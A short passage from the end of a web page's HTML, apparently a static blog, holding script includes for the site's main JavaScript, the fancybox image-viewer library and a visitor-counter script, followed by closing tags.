src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>